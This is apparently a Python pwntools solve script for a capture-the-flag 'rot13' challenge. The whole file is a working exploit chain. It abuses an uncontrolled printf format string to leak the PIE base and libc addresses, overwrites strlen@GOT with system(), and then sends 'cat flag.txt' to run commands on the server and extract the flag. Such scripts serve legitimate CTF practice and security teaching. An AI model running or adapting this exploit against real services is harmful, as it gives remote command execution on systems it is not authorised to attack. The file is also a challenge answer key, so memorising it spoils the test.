#!/usr/bin/env python3
# python3 port of the format-string -> GOT-overwrite solve, re-derived for the
# stdio-converted (main) build. printf(line) is an uncontrolled format string on
# a PIE binary with partial RELRO.
#   - arg 3 leaks a return address into main (exe_base + 0x959) -> PIE base
#   - read printf@GOT via %s -> libc base (printf is not an IFUNC, unlike strlen)
#   - overwrite strlen@GOT with system()
#   - strlen(line) at the top of the loop then runs system(line): send a command
# Payloads are pre-rot13'd (rot13 is self-inverse) so the program rot13s them back.
import sys, os, re
from pwn import ELF, remote, context, p32, u32, fmtstr_payload
import glob as _glob
def _find_libc(name):
    # The challenge libc ships only under the repo's publish/ tree (its *.so name
    # is gitignored in the challenge dir). Find it so ELF(name) works in `check`.
    if os.path.exists(name):
        return name
    d=os.path.dirname(os.path.abspath(__file__))
    for _ in range(6):
        cand=os.path.join(d,'publish')
        if os.path.isdir(cand):
            hits=_glob.glob(os.path.join(cand,'**',name),recursive=True)
            if hits:
                return hits[0]
        d=os.path.dirname(d)
    return name
HOST=os.environ.get('HOST', sys.argv[1] if len(sys.argv)>1 else '127.0.0.1')
PORT=int(os.environ.get('PORT', sys.argv[2] if len(sys.argv)>2 else 18003))
exe=ELF(".build/rot13" if os.path.exists(".build/rot13") else "rot13"); libc=ELF(_find_libc("rot13-libc.so")); context.binary=exe; context.log_level='error'
OFF=11
def rot13(b):
    return bytes((c-97+13)%26+97 if 97<=c<=122 else (c-65+13)%26+65 if 65<=c<=90 else c for c in b)
def rnd(io,data):
    io.recvuntil(b"to be rot13 encrypted:\n"); io.sendline(rot13(data))
    io.recvuntil(b"Rot13 encrypted data: ")
    return io.recvline().rstrip(b"\n")
def attempt():
    io=remote(HOST,PORT)
    exe.address=int(rnd(io,b"|%3$p|").split(b"|")[1],16)-0x959
    pg=exe.got["printf"]
    if b"\n" in p32(pg): io.close(); return None
    line=rnd(io, p32(pg)+b"||%11$s||")
    parts=line.split(b"||")
    if len(parts)<2 or len(parts[1])<4: io.close(); return None
    libc.address=u32(parts[1][:4])-libc.symbols["printf"]
    if libc.address & 0xfff: io.close(); return None
    strlen_got=exe.got["strlen"]
    payload=fmtstr_payload(OFF, {strlen_got: libc.symbols["system"]}, write_size="short")
    if b"\n" in payload: io.close(); return None
    rnd(io, payload)
    # strlen(line) is now system(line); send a raw command (not rot13'd)
    io.recvuntil(b"to be rot13 encrypted:\n"); io.sendline(b"cat flag.txt")
    data=io.recvall(timeout=4); io.close()
    m=re.search(rb'sun\{[^}]*\}', data)
    return m.group(0).decode() if m else None
for _ in range(10):
    f=attempt()
    if f: print(f); break
